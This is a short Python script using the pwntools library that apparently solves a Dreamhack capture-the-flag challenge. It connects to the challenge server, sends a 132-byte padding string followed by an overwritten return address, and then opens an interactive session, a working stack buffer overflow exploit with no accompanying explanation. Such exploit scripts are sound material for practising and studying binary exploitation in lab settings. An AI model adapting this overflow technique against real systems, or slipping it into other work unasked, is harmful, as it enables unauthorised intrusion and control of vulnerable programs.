#! /usr/bin/python3
from pwn import *
p = remote("host3.dreamhack.games", 14083)

shellcode = b"A" * 132
shellcode += b"\xb9\x85\x04\x08"

p.sendline(shellcode)
p.interactive()
